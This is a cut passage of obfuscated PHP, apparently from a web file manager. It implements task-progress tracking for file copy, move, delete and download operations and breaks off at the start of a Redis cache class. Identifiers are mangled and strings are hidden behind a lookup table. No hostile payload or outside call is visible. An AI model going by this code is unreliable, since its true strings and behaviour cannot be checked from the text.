$óÓ°í¬¸, $ŸÔ¸½Éõ[528] => $ŸÔ¸½Éõ[12], $ŸÔ¸½Éõ[33] => $°Ö²Ü„‘, $ŸÔ¸½Éõ[1161] => $ŸÔ¸½Éõ[12], $ŸÔ¸½Éõ[1159] => $âØâÏéî, $ŸÔ¸½Éõ[1796] => 0, $ŸÔ¸½Éõ[1797] => 0, $ŸÔ¸½Éõ[1798] => 0, $ŸÔ¸½Éõ[1799] => timeFloat(), $ŸÔ¸½Éõ[1800] => 0, $ŸÔ¸½Éõ[1801] => 0, $ŸÔ¸½Éõ[1802] => 0, $ŸÔ¸½Éõ[1803] => 0, $ŸÔ¸½Éõ[835] => $ŸÔ¸½Éõ[1744]); $GLOBALS[$ŸÔ¸½Éõ[1804]] = 1; Hook::bind($ŸÔ¸½Éõ[1748], array($this, $ŸÔ¸½Éõ[1805])); Hook::bind($ŸÔ¸½Éõ[1806], array($this, $ŸÔ¸½Éõ[1807])); $this->startAfter(); Hook::trigger($ŸÔ¸½Éõ[1808], $this->task); $this->task[$ŸÔ¸½Éõ[1801]] = timeFloat(); } public function end($“ÒùØ÷Î = '') { $ãø¯ÒòÈ =& $_SERVER[™¸œØ®Ü]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ãø¯ÒòÈ[1801]]) { self::valueSet($this->task[$ãø¯ÒòÈ[477]], !1); } $this->isEnd = !0; if ($“ÒùØ÷Î) { $this->task[$ãø¯ÒòÈ[528]] = $“ÒùØ÷Î; } self::log($ãø¯ÒòÈ[1809] . $this->task[$ãø¯ÒòÈ[477]] . $ãø¯ÒòÈ[1810] . sprintf($ãø¯ÒòÈ[942], timeFloat() - $this->task[$ãø¯ÒòÈ[1799]]) . $ãø¯ÒòÈ[1811]); Hook::unbind($ãø¯ÒòÈ[1748], array($this, $ãø¯ÒòÈ[1805])); Hook::unbind($ãø¯ÒòÈ[1806], array($this, $ãø¯ÒòÈ[1807])); $this->endAfter(); $’¤ûï§¡ = $this->task; $this->task = !1; Hook::trigger($ãø¯ÒòÈ[1812], $’¤ûï§¡); } public function update($İãçÇ‘ = 0, $õ Í’Ìó = false) { $Èî“í‚¤ =& $_SERVER[™¸œØ®Ü]; $¦ÀÛ«’É =& $this->task; if (!$¦ÀÛ«’É) { return; } $¦ÀÛ«’É[$Èî“í‚¤[1796]] += $İãçÇ‘; $¦ÀÛ«’É[$Èî“í‚¤[1800]] = timeFloat(); if ($¦ÀÛ«’É[$Èî“í‚¤[1159]]) { if ($¦ÀÛ«’É[$Èî“í‚¤[1159]] < $¦ÀÛ«’É[$Èî“í‚¤[1796]]) { $¦ÀÛ«’É[$Èî“í‚¤[1159]] = $¦ÀÛ«’É[$Èî“í‚¤[1796]]; } $¸ïæöšÇ = timeFloat() - $¦ÀÛ«’É[$Èî“í‚¤[1799]] - $¦ÀÛ«’É[$Èî“í‚¤[1802]]; if ($¸ïæöšÇ <= 0) { $¸ïæöšÇ = 0.001; } $¦ÀÛ«’É[$Èî“í‚¤[1797]] = $¦ÀÛ«’É[$Èî“í‚¤[1796]] / $¦ÀÛ«’É[$Èî“í‚¤[1159]]; $¦ÀÛ«’É[$Èî“í‚¤[1798]] = $¦ÀÛ«’É[$Èî“í‚¤[1796]] / $¸ïæöšÇ; if ($¦ÀÛ«’É[$Èî“í‚¤[1797]] > 0) { $¦ÀÛ«’É[$Èî“í‚¤[1803]] = $¸ïæöšÇ * (1 - $¦ÀÛ«’É[$Èî“í‚¤[1797]]) / $¦ÀÛ«’É[$Èî“í‚¤[1797]]; } $¦ÀÛ«’É[$Èî“í‚¤[1803]] = $¦ÀÛ«’É[$Èî“í‚¤[1803]] <= 0 ? 0 : $¦ÀÛ«’É[$Èî“í‚¤[1803]]; } $this->updateAfter(); $Õ«Äñ§ = 0.2; if (timeFloat() - $¦ÀÛ«’É[$Èî“í‚¤[1801]] < $Õ«Äñ§ && !$õ Í’Ìó) { return; } $É¥­æßå = self::get($¦ÀÛ«’É[$Èî“í‚¤[477]]); $Ïù¾…Ä = $É¥­æßå[$Èî“í‚¤[835]]; if ($Ïù¾…Ä == self::STATYS_KILL) { $¿îäÊ¤¬ = array($Èî“í‚¤[1813] => LNG($Èî“í‚¤[1814]), $Èî“í‚¤[1316] => !1); Cache::set($Èî“í‚¤[1815] . $this->task[$Èî“í‚¤[477]], $¿îäÊ¤¬, 30); $this->onKill(); $this->end(); die; } else { if ($Ïù¾…Ä == self::STATYS_STOP) { $Şè”‚ = 2; $É¥­æßå[$Èî“í‚¤[1802]] += $Şè”‚; self::valueSet($¦ÀÛ«’É[$Èî“í‚¤[477]], $É¥­æßå); sleep($Şè”‚); $this->update(); return; } } $¦ÀÛ«’É[$Èî“í‚¤[835]] = $Ïù¾…Ä ? $Ïù¾…Ä : $¦ÀÛ«’É[$Èî“í‚¤[835]]; $¦ÀÛ«’É[$Èî“í‚¤[1802]] = $É¥­æßå[$Èî“í‚¤[1802]] ? $É¥­æßå[$Èî“í‚¤[1802]] : 0; $¦ÀÛ«’É[$Èî“í‚¤[1801]] = timeFloat(); Hook::trigger($Èî“í‚¤[1816], $¦ÀÛ«’É); self::valueSet($¦ÀÛ«’É[$Èî“í‚¤[477]], $¦ÀÛ«’É); } public function onKillSet($ë×š ±„, $°‘¹“ƒ = array()) { $this->onKillCall = array($ë×š ±„, $°‘¹“ƒ); } public function onKill() { $ÕÚ€æ»× =& $_SERVER[™¸œØ®Ü]; self::log($ÕÚ€æ»×[1809] . $this->task[$ÕÚ€æ»×[477]] . $ÕÚ€æ»×[1817]); Hook::trigger($ÕÚ€æ»×[1818], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($®š„»æó) { $€ŸìéÜ· =& $_SERVER[™¸œØ®Ü]; Cache::set($€ŸìéÜ·[1815] . $this->task[$€ŸìéÜ·[477]], $®š„»æó, 60); if (!is_array($®š„»æó) || !$®š„»æó[$€ŸìéÜ·[1316]]) { self::log($€ŸìéÜ·[1819] . json_encode($®š„»æó)); } return $®š„»æó; } public static function get($¾íŒ·•Í) { $şİ¨•Ö =& $_SERVER[™¸œØ®Ü]; $Éé®§¦ı = self::valueGet($¾íŒ·•Í); if (is_array($Éé®§¦ı) && $Éé®§¦ı[$şİ¨•Ö[1820]]) { $Ğ»ÁÌš§ = ActionApply($Éé®§¦ı[$şİ¨•Ö[1820]], array($Éé®§¦ı)); $Éé®§¦ı = is_array($Ğ»ÁÌš§) ? $Ğ»ÁÌš§ : $Éé®§¦ı; } return $Éé®§¦ı; } public static function listData() { $Ò ‰ˆşµ = self::valueGet(); return array_sort_by($Ò ‰ˆşµ, $_SERVER[™¸œØ®Ü][1799], !0); } public static function kill($¹Ó¨î˜¶) { return self::changeStatus($¹Ó¨î˜¶, self::STATYS_KILL); } public static function stop($Ôáã¤Üø) { return self::changeStatus($Ôáã¤Üø, self::STATYS_STOP); } public static function restart($Õê³ô‚¬) { return self::changeStatus($Õê³ô‚¬, self::STATYS_RUNNING); } public static function killAll() { $òÃ¤”Â =& $_SERVER[™¸œØ®Ü]; $ñû…‹ = self::listData(); foreach ($ñû…‹ as $ÉÜªôŠ) { self::kill($ÉÜªôŠ[$òÃ¤”Â[477]]); } sleep(2); foreach ($ñû…‹ as $ÉÜªôŠ) { self::valueSet($ÉÜªôŠ[$òÃ¤”Â[477]], !1); } } private static function changeStatus($÷œü‚Ôù, $Å¥Ş­”) { $ßÚØËùÇ =& $_SERVER[™¸œØ®Ü]; $åŠ¯Üè¸ = self::valueGet($÷œü‚Ôù); if (!$åŠ¯Üè¸) { return !1; } $åŠ¯Üè¸[$ßÚØËùÇ[835]] = $Å¥Ş­”; self::valueSet($÷œü‚Ôù, $åŠ¯Üè¸); self::log($ßÚØËùÇ[1821] . $åŠ¯Üè¸[$ßÚØËùÇ[477]] . $ßÚØËùÇ[1822] . $Å¥Ş­”); return !0; } public static function valueGet($ƒÅñüí° = false) { $ÇŠ’Áßø =& $_SERVER[™¸œØ®Ü]; if ($ƒÅñüí°) { $òÓ¡İ€¦ = Model($ÇŠ’Áßø[522])->where(array($ÇŠ’Áßø[97] => $ƒÅñüí°, $ÇŠ’Áßø[33] => $ÇŠ’Áßø[1168]))->find(); return $òÓ¡İ€¦ ? json_decode($òÓ¡İ€¦[$ÇŠ’Áßø[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ñÖğ÷ü” = false) { $ÛøÜêÙ‘ =& $_SERVER[™¸œØ®Ü]; $Çø›À¥ = array($ÛøÜêÙ‘[33] => $ÛøÜêÙ‘[1168]); if ($ñÖğ÷ü”) { $Çø›À¥[$ÛøÜêÙ‘[1795]] = $ñÖğ÷ü”; } $©Ú¦ùò½ = Model($ÛøÜêÙ‘[522])->where($Çø›À¥)->select(); $©Ú¦ùò½ = $©Ú¦ùò½ ? $©Ú¦ùò½ : array(); foreach ($©Ú¦ùò½ as $ŞÃ†Ó­Œ => $œÀ°ûÚÕ) { $©Ú¦ùò½[$ŞÃ†Ó­Œ] = json_decode($œÀ°ûÚÕ[$ÛøÜêÙ‘[452]], !0); } return $©Ú¦ùò½; } public static function valueSet($¥¸Ò®ŞŠ, $‹ö¶‚²Ğ) { $ñó•Ü˜‰ =& $_SERVER[™¸œØ®Ü]; if (!$‹ö¶‚²Ğ) { return Model($ñó•Ü˜‰[522])->where(array($ñó•Ü˜‰[97] => $¥¸Ò®ŞŠ, $ñó•Ü˜‰[33] => $ñó•Ü˜‰[1168]))->delete(); } $Ÿ“ƒ°— = json_encode($‹ö¶‚²Ğ); if (!$Ÿ“ƒ°—) { ob_start(); var_dump($‹ö¶‚²Ğ); $ÂÏø€Ïï = ob_get_clean(); self::log($ñó•Ü˜‰[1823] . json_encode_force($ÂÏø€Ïï)); } if (!$¥¸Ò®ŞŠ || !$‹ö¶‚²Ğ[$ñó•Ü˜‰[477]]) { return !1; } $øªõˆ‰ë = array($ñó•Ü˜‰[33] => $ñó•Ü˜‰[1168], $ñó•Ü˜‰[1795] => USER_ID, $ñó•Ü˜‰[97] => $¥¸Ò®ŞŠ, $ñó•Ü˜‰[452] => $Ÿ“ƒ°—); $ƒö÷ûîì = $ñó•Ü˜‰[1824]; CacheLock::lock($ƒö÷ûîì); Model($ñó•Ü˜‰[522])->add($øªõˆ‰ë, array(), !0); CacheLock::unlock($ƒö÷ûîì); } public static function log($ƒŒ´•ï·) { if (!GLOBAL_DEBUG) { return; } write_log($ƒŒ´•ï·, $_SERVER[™¸œØ®Ü][1825]); } } class TaskFileTransfer extends Task { protected function startAfter() { $–ÅÃõÙ› =& $_SERVER[™¸œØ®Ü]; $‚‰“‘æ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($–ÅÃõÙ›[1826], array($this, $–ÅÃõÙ›[1827])); Hook::bind($–ÅÃõÙ›[1327], array($this, $–ÅÃõÙ›[1828])); Hook::bind($–ÅÃõÙ›[1829], array($this, $–ÅÃõÙ›[1830])); Hook::bind($–ÅÃõÙ›[675], array($this, $–ÅÃõÙ›[1831])); Hook::bind($–ÅÃõÙ›[676], array($this, $–ÅÃõÙ›[1832])); Hook::bind($–ÅÃõÙ›[682], array($this, $–ÅÃõÙ›[1833])); Hook::bind($–ÅÃõÙ›[683], array($this, $–ÅÃõÙ›[1834])); Hook::bind($–ÅÃõÙ›[678], array($this, $–ÅÃõÙ›[1835])); Hook::bind($–ÅÃõÙ›[680], array($this, $–ÅÃõÙ›[1836])); Hook::bind($–ÅÃõÙ›[644], array($this, $–ÅÃõÙ›[1837])); Hook::bind($–ÅÃõÙ›[641], array($this, $–ÅÃõÙ›[1837])); Hook::bind($–ÅÃõÙ›[646], array($this, $–ÅÃõÙ›[1837])); Hook::bind($–ÅÃõÙ›[648], array($this, $–ÅÃõÙ›[1837])); Hook::bind($–ÅÃõÙ›[650], array($this, $–ÅÃõÙ›[1837])); Hook::bind($–ÅÃõÙ›[1838], array($this, $–ÅÃõÙ›[1839])); Hook::bind($–ÅÃõÙ›[666], array($this, $–ÅÃõÙ›[1840])); $this->sourceModelCopyFlag = !1; Hook::bind($–ÅÃõÙ›[1841], array($this, $–ÅÃõÙ›[1842])); Hook::bind($–ÅÃõÙ›[1843], array($this, $–ÅÃõÙ›[1844])); Hook::bind($–ÅÃõÙ›[1845], array($this, $–ÅÃõÙ›[1846])); $‚‰“‘æ[$–ÅÃõÙ›[1847]] = LNG($–ÅÃõÙ›[1848]); $‚‰“‘æ[$–ÅÃõÙ›[1849]] = 0; $‚‰“‘æ[$–ÅÃõÙ›[1850]] = 0; $‚‰“‘æ[$–ÅÃõÙ›[1161]] = $–ÅÃõÙ›[12]; $‚‰“‘æ[$–ÅÃõÙ›[1851]] = $–ÅÃõÙ›[12]; $‚‰“‘æ[$–ÅÃõÙ›[1852]] = 0; $‚‰“‘æ[$–ÅÃõÙ›[1853]] = 0; $‚‰“‘æ[$–ÅÃõÙ›[1854]] = 0; if (!$‚‰“‘æ[$–ÅÃõÙ›[1683]]) { $‚‰“‘æ[$–ÅÃõÙ›[1683]] = LNG($–ÅÃõÙ›[1855]); } } protected function endAfter() { $Ä·™¿Ö´ =& $_SERVER[™¸œØ®Ü]; Hook::unbind($Ä·™¿Ö´[1826], array($this, $Ä·™¿Ö´[1827])); Hook::unbind($Ä·™¿Ö´[1327], array($this, $Ä·™¿Ö´[1828])); Hook::unbind($Ä·™¿Ö´[1829], array($this, $Ä·™¿Ö´[1830])); Hook::unbind($Ä·™¿Ö´[675], array($this, $Ä·™¿Ö´[1831])); Hook::unbind($Ä·™¿Ö´[676], array($this, $Ä·™¿Ö´[1832])); Hook::unbind($Ä·™¿Ö´[682], array($this, $Ä·™¿Ö´[1833])); Hook::unbind($Ä·™¿Ö´[683], array($this, $Ä·™¿Ö´[1834])); Hook::unbind($Ä·™¿Ö´[678], array($this, $Ä·™¿Ö´[1835])); Hook::unbind($Ä·™¿Ö´[680], array($this, $Ä·™¿Ö´[1836])); Hook::unbind($Ä·™¿Ö´[644], array($this, $Ä·™¿Ö´[1837])); Hook::unbind($Ä·™¿Ö´[641], array($this, $Ä·™¿Ö´[1837])); Hook::unbind($Ä·™¿Ö´[646], array($this, $Ä·™¿Ö´[1837])); Hook::unbind($Ä·™¿Ö´[648], array($this, $Ä·™¿Ö´[1837])); Hook::unbind($Ä·™¿Ö´[650], array($this, $Ä·™¿Ö´[1837])); Hook::unbind($Ä·™¿Ö´[1838], array($this, $Ä·™¿Ö´[1839])); Hook::unbind($Ä·™¿Ö´[666], array($this, $Ä·™¿Ö´[1840])); Hook::unbind($Ä·™¿Ö´[1841], array($this, $Ä·™¿Ö´[1842])); Hook::unbind($Ä·™¿Ö´[1843], array($this, $Ä·™¿Ö´[1844])); Hook::unbind($Ä·™¿Ö´[1845], array($this, $Ä·™¿Ö´[1846])); } public function copyMoveStart($øøÆµÒÚ, $Í¶®Ñ‰Ğ, $Ä¯ÅÀ“, $Ê›§âìò) { $¹“ô€œ =& $_SERVER[™¸œØ®Ü]; self::log($¹“ô€œ[1856] . $Í¶®Ñ‰Ğ . $¹“ô€œ[73] . $Ê›§âìò); $ã‘€¿Óğ = rtrim(TEMP_FILES, $¹“ô€œ[8]); if (substr($Í¶®Ñ‰Ğ, 0, strlen($ã‘€¿Óğ)) == $ã‘€¿Óğ) { return; } if (substr($Ê›§âìò, 0, strlen($ã‘€¿Óğ)) == $ã‘€¿Óğ) { return; } $ÈÇ±¢ =& $this->task; $ÈÇ±¢[$¹“ô€œ[1857]] = KodIO::transferType($øøÆµÒÚ, $Ä¯ÅÀ“); $this->update(); } public function updateAfter() { $ÙˆóÉ¬¨ =& $_SERVER[™¸œØ®Ü]; $“Û¡ÂŠ¨ =& $this->task; if (!$“Û¡ÂŠ¨[$ÙˆóÉ¬¨[848]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($“Û¡ÂŠ¨[$ÙˆóÉ¬¨[1857]] == $ÙˆóÉ¬¨[1421]) { return; } self::updateTask($“Û¡ÂŠ¨); } private static function updateTask(&$àí’õ‘¯) { $°”®Ï† =& $_SERVER[™¸œØ®Ü]; if ($àí’õ‘¯[$°”®Ï†[1857]] == $°”®Ï†[1298] || $àí’õ‘¯[$°”®Ï†[1857]] == $°”®Ï†[110]) { if ($àí’õ‘¯[$°”®Ï†[1851]]) { $àí’õ‘¯[$°”®Ï†[1854]] = $àí’õ‘¯[$°”®Ï†[1853]] + $àí’õ‘¯[$°”®Ï†[1850]]; } } else { if ($àí’õ‘¯[$°”®Ï†[1857]] == $°”®Ï†[1422]) { if ($àí’õ‘¯[$°”®Ï†[1851]] == $°”®Ï†[1298]) { $àí’õ‘¯[$°”®Ï†[1854]] = $àí’õ‘¯[$°”®Ï†[1853]] + $àí’õ‘¯[$°”®Ï†[1850]] * 0.5; } else { if ($àí’õ‘¯[$°”®Ï†[1851]] == $°”®Ï†[110]) { $àí’õ‘¯[$°”®Ï†[1854]] = $àí’õ‘¯[$°”®Ï†[1853]] + $àí’õ‘¯[$°”®Ï†[1849]] * 0.5 + $àí’õ‘¯[$°”®Ï†[1850]] * 0.5; } } } } $àí’õ‘¯[$°”®Ï†[1797]] = $àí’õ‘¯[$°”®Ï†[1854]] / $àí’õ‘¯[$°”®Ï†[848]]; if ($àí’õ‘¯[$°”®Ï†[1797]] > 0) { $ç££·ŒË = timeFloat() - $àí’õ‘¯[$°”®Ï†[1799]] - $àí’õ‘¯[$°”®Ï†[1802]]; $àí’õ‘¯[$°”®Ï†[1803]] = $ç££·ŒË * (1 - $àí’õ‘¯[$°”®Ï†[1797]]) / $àí’õ‘¯[$°”®Ï†[1797]]; } } public function addPath($ñï”î‹) { $¾¼ø£Û¬ =& $_SERVER[™¸œØ®Ü]; if (!$ñï”î‹) { return; } $™Æ°¹¦¯ =& $this->task; $è¨”¤ñ‹ = IO::infoWithChildren($ñï”î‹); $˜ô¶ß‘ = $™Æ°¹¦¯[$¾¼ø£Û¬[1858]] ? $™Æ°¹¦¯[$¾¼ø£Û¬[1858]][$¾¼ø£Û¬[1859]] : 0; $™Æ°¹¦¯[$¾¼ø£Û¬[1858]] = array($¾¼ø£Û¬[1859] => $˜ô¶ß‘ + 1, $¾¼ø£Û¬[496] => $è¨”¤ñ‹[$¾¼ø£Û¬[32]], $¾¼ø£Û¬[87] => $è¨”¤ñ‹[$¾¼ø£Û¬[87]], $¾¼ø£Û¬[586] => $è¨”¤ñ‹[$¾¼ø£Û¬[586]] ? $è¨”¤ñ‹[$¾¼ø£Û¬[586]] : $è¨”¤ñ‹[$¾¼ø£Û¬[87]]); if ($è¨”¤ñ‹[$¾¼ø£Û¬[33]] == $¾¼ø£Û¬[232]) { $™Æ°¹¦¯[$¾¼ø£Û¬[1159]] += 1; } else { $™Æ°¹¦¯[$¾¼ø£Û¬[1159]] += $è¨”¤ñ‹[$¾¼ø£Û¬[82]][$¾¼ø£Û¬[80]]; if ($è¨”¤ñ‹[$¾¼ø£Û¬[193]]) { $™Æ°¹¦¯[$¾¼ø£Û¬[1159]] += $è¨”¤ñ‹[$¾¼ø£Û¬[82]][$¾¼ø£Û¬[81]] + 1; } } $™Æ°¹¦¯[$¾¼ø£Û¬[848]] += $è¨”¤ñ‹[$¾¼ø£Û¬[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($…ê„ìŠš) { } public function sourceAddHashEnd($’œ¶˜ŠÙ) { } public function sourceAddFileStart($÷®ä’¤Ğ) { $‹±Çî’ =& $_SERVER[™¸œØ®Ü]; $–ú„Ä„® =& $this->task; $–ú„Ä„®[$‹±Çî’[1849]] = $÷®ä’¤Ğ[$‹±Çî’[79]]; $–ú„Ä„®[$‹±Çî’[1847]] = $÷®ä’¤Ğ[$‹±Çî’[32]]; $–ú„Ä„®[$‹±Çî’[1161]] = $÷®ä’¤Ğ[$‹±Çî’[32]]; $–ú„Ä„®[$‹±Çî’[1860]] = $÷®ä’¤Ğ[$‹±Çî’[87]]; $this->update(); } public function sourceAddFileEnd($ÒÜõ»øö) { $†©­ûõ´ =& $_SERVER[™¸œØ®Ü]; $ªö•Úš =& $this->task; $ªö•Úš[$†©­ûõ´[1854]] += $ÒÜõ»øö[$†©­ûõ´[79]]; $ªö•Úš[$†©­ûõ´[1860]] = $ÒÜõ»øö[$†©­ûõ´[87]]; $this->update(1); } public function copyFileStart($£Ù¢äß¤, $ó…µ÷åü, $Ğ¶Ù , $×ÀËÍÁÕ, $ú®˜Ê÷, $âº½²¼ã) { $ÙàüÒ… =& $_SERVER[™¸œØ®Ü]; $İÖ¡ÇÂû = $ú®˜Ê÷; if ($İÖ¡ÇÂû == $GLOBALS[$ÙàüÒ…[1861]]) { $İÖ¡ÇÂû = $GLOBALS[$ÙàüÒ…[1862]]; } $GLOBALS[$ÙàüÒ…[1862]] = $ú®˜Ê÷; $GLOBALS[$ÙàüÒ…[1861]] = $âº½²¼ã; $ÌÌ ‡£‹ =& $this->task; $ÌÌ ‡£‹[$ÙàüÒ…[1847]] = $İÖ¡ÇÂû; $ÌÌ ‡£‹[$ÙàüÒ…[1849]] = (int) $£Ù¢äß¤->size($ó…µ÷åü); $ÌÌ ‡£‹[$ÙàüÒ…[1850]] = 0; $ÌÌ ‡£‹[$ÙàüÒ…[1161]] = $ÙàüÒ…[12]; $ÌÌ ‡£‹[$ÙàüÒ…[1851]] = $ÙàüÒ…[12]; $ÌÌ ‡£‹[$ÙàüÒ…[1852]] = 0; $îµ¤´·Î = $ÌÌ ‡£‹[$ÙàüÒ…[1849]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÌÌ ‡£‹[$ÙàüÒ…[477]] . $ÙàüÒ…[1863]); if ($îµ¤´·Î && file_exists(get_path_father($×ÀËÍÁÕ))) { Cache::set($ÌÌ ‡£‹[$ÙàüÒ…[477]] . $ÙàüÒ…[1863], $×ÀËÍÁÕ); $ÌÌ ‡£‹[$ÙàüÒ…[1820]] = array($ÙàüÒ…[1864], $ÙàüÒ…[1865]); } $this->update(0, $îµ¤´·Î); } public static function updateCopyLocalFileSize($ÍÉŸŸÁ±) { $¾°ßì =& $_SERVER[™¸œØ®Ü]; $°Û¾è÷ş = Cache::get($ÍÉŸŸÁ±[$¾°ßì[477]] . $¾°ßì[1863]); if (!$°Û¾è÷ş || !file_exists($°Û¾è÷ş)) { return $ÍÉŸŸÁ±; } $ÍÉŸŸÁ±[$¾°ßì[1850]] = @filesize($°Û¾è÷ş); $ÍÉŸŸÁ±[$¾°ßì[1854]] += $ÍÉŸŸÁ±[$¾°ßì[1850]]; self::updateTask($ÍÉŸŸÁ±); return $ÍÉŸŸÁ±; } public function copyFileEnd($¶…°ñÉÊ, $ëÃŸË¢, $£èıø, $¥È¨º›®, $ìĞş¾ë¸, $Õ¬áª•Š) { $¸–úß•Î =& $_SERVER[™¸œØ®Ü]; $Í™ƒ¾£ =& $this->task; $Í™ƒ¾£[$¸–úß•Î[1850]] = $Í™ƒ¾£[$¸–úß•Î[1849]]; $Í™ƒ¾£[$¸–úß•Î[1851]] = $¸–úß•Î[12]; unset($Í™ƒ¾£[$¸–úß•Î[1820]]); if ($ìĞş¾ë¸ == $Í™ƒ¾£[$¸–úß•Î[1847]]) { $Í™ƒ¾£[$¸–úß•Î[1853]] += $Í™ƒ¾£[$¸–úß•Î[1849]]; $Í™ƒ¾£[$¸–úß•Î[1854]] = $Í™ƒ¾£[$¸–úß•Î[1853]]; $¨Ü–Õ¨ô = 1; if (isset($Í™ƒ¾£[$¸–úß•Î[1860]]) && $Í™ƒ¾£[$¸–úß•Î[1860]] == $ëÃŸË¢) { $¨Ü–Õ¨ô = 0; } $this->update($¨Ü–Õ¨ô); } else { $this->update(); $Í™ƒ¾£[$¸–úß•Î[1850]] = 0; } Cache::remove($Í™ƒ¾£[$¸–úß•Î[477]] . $¸–úß•Î[1863]); self::log($¸–úß•Î[1866] . $ëÃŸË¢ . $¸–úß•Î[73] . $¥È¨º›® . $¸–úß•Î[287] . $ìĞş¾ë¸ . $¸–úß•Î[1867] . $Í™ƒ¾£[$¸–úß•Î[1847]]); } public function updateFileEnd($ÂûƒÙäÈ, $šê×ó™¦) { $”Ó¯Íº =& $_SERVER[™¸œØ®Ü]; $â½€ÔĞ =& $this->task; $â½€ÔĞ[$”Ó¯Íº[1847]] = $ÂûƒÙäÈ; $â½€ÔĞ[$”Ó¯Íº[1849]] = $šê×ó™¦; $â½€ÔĞ[$”Ó¯Íº[1853]] += $šê×ó™¦; $â½€ÔĞ[$”Ó¯Íº[1854]] = $â½€ÔĞ[$”Ó¯Íº[1853]]; $this->update(1); self::log($”Ó¯Íº[1868] . $ÂûƒÙäÈ); } public function sourceModelCopy($¾¿ÂÃô†) { $àÚùãÁ† =& $_SERVER[™¸œØ®Ü]; $—ª­ş”® = $¾¿ÂÃô†[0]; $Ñ½¹àöÀ = $¾¿ÂÃô†[1]; $¯ßå˜Üç =& $this->task; $this->sourceModelCopyFlag = !0; $Ä­íê’º = 0; switch ($—ª­ş”®) { case $àÚùãÁ†[642]: $Ä­íê’º = 1; break; case $àÚùãÁ†[645]: $¯ßå˜Üç[$àÚùãÁ†[1847]] = $Ñ½¹àöÀ[$àÚùãÁ†[32]]; break; case $àÚùãÁ†[647]: $Ä­íê’º = intval($¾¿ÂÃô†[$àÚùãÁ†[458]] * 0.4); break; case $àÚùãÁ†[649]: $Ä­íê’º = intval($¾¿ÂÃô†[$àÚùãÁ†[458]] * 0.2); break; case $àÚùãÁ†[651]: $Ä­íê’º = intval($¾¿ÂÃô†[$àÚùãÁ†[458]] * 0.4); break; } $this->update($Ä­íê’º); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¡Øñİ, $¿ñ¼‡) { $ã’Î™üŸ =& $_SERVER[™¸œØ®Ü]; $this->sourceModelCopyFlag = !0; $ä¨ Å÷Û = 1; if (isset($¡Øñİ[$ã’Î™üŸ[82]])) { $ä¨ Å÷Û = $¡Øñİ[$ã’Î™üŸ[82]][$ã’Î™üŸ[80]]; $ä¨ Å÷Û = $ä¨ Å÷Û + $¡Øñİ[$ã’Î™üŸ[82]][$ã’Î™üŸ[81]] + 1; } $this->update($ä¨ Å÷Û); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÀÇ×éÎ¦) { $this->sourceRemove($ÀÇ×éÎ¦, !1); } public function curlProgress($ö°‘”ˆ†, $ı¯Ä¼¨Ô, $¦ŠØÕ , $ææŸß¾ç, $åÛäá¡) { $ûÄŞÚ±„ =& $_SERVER[™¸œØ®Ü]; $†…Õ©—Ê =& $this->task; if ($åÛäá¡ > 0) { $†…Õ©—Ê[$ûÄŞÚ±„[1161]] = $ûÄŞÚ±„[1869]; $†…Õ©—Ê[$ûÄŞÚ±„[1851]] = $ûÄŞÚ±„[110]; if ($†…Õ©—Ê[$ûÄŞÚ±„[1849]]) { $†…Õ©—Ê[$ûÄŞÚ±„[1850]] = $åÛäá¡; } if ($†…Õ©—Ê[$ûÄŞÚ±„[1852]]) { $†…Õ©—Ê[$ûÄŞÚ±„[1850]] = $åÛäá¡ + $†…Õ©—Ê[$ûÄŞÚ±„[1852]]; } } else { if ($¦ŠØÕ  > 0) { if ($†…Õ©—Ê[$ûÄŞÚ±„[1849]] == $ı¯Ä¼¨Ô) { $†…Õ©—Ê[$ûÄŞÚ±„[1850]] = $¦ŠØÕ ; $†…Õ©—Ê[$ûÄŞÚ±„[1161]] = $ûÄŞÚ±„[1870]; $†…Õ©—Ê[$ûÄŞÚ±„[1851]] = $ûÄŞÚ±„[1298]; } } } $this->update(); } public function curlProgressStart($¾ÌÀ’³) { } public function curlProgressEnd($Æ“«ş‚¿) { $ğ±¢ØÜç =& $_SERVER[™¸œØ®Ü]; $•“Ú¯·Ö =& $this->task; $ïüèĞÀË = curl_getinfo($Æ“«ş‚¿); $òÌÃŒĞò = $ïüèĞÀË[$ğ±¢ØÜç[1871]]; if ($òÌÃŒĞò == -1) { $òÌÃŒĞò = $ïüèĞÀË[$ğ±¢ØÜç[1872]]; } if ($•“Ú¯·Ö[$ğ±¢ØÜç[1851]] == $ğ±¢ØÜç[110] && $òÌÃŒĞò) { $•“Ú¯·Ö[$ğ±¢ØÜç[1852]] += $òÌÃŒĞò; } $this->update(); } } goto Dœ¾‰ØœÉ; FÙãöññ®: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($£ËòğÎ, $ğÊ—®”) { $¬¸Ääº =& $_SERVER[™¸œØ®Ü]; if (!class_exists($¬¸Ääº[961])) { show_json($¬¸Ääº[962], !1); } $this->cacheTime = $ğÊ—®”; $á·ÇÔÔ³ = isset($£ËòğÎ[$¬¸Ääº[963]]) ? $£ËòğÎ[$¬¸Ääº[963]] : 10; $ä«ÙİÖœ = _get($£ËòğÎ, $¬¸Ääº[960]); if ($ä«ÙİÖœ && is_array($ä«ÙİÖœ)) { $this->initCluster($£ËòğÎ, $á·ÇÔÔ³); } else { $this->handle = $this->init($£ËòğÎ, $á·ÇÔÔ³); } } private function init($èŒ¨‹ÅŠ, $İÅÕ¢Çø) { $œ¤Š”‚  =& $_SERVER[™¸œØ®Ü]; $½ÂÀÁ®† = new Redis(); $ÅÕ‡¤Ä³ = isset($èŒ¨‹ÅŠ[$œ¤Š”‚ [964]]) ? $èŒ¨‹ÅŠ[$œ¤Š”‚ [964]] : !1; if ($ÅÕ‡¤Ä³) { $½ÂÀÁ®†->pconnect($èŒ¨‹ÅŠ[$œ¤Š”‚ [208]], $èŒ¨‹ÅŠ[$œ¤Š”‚ 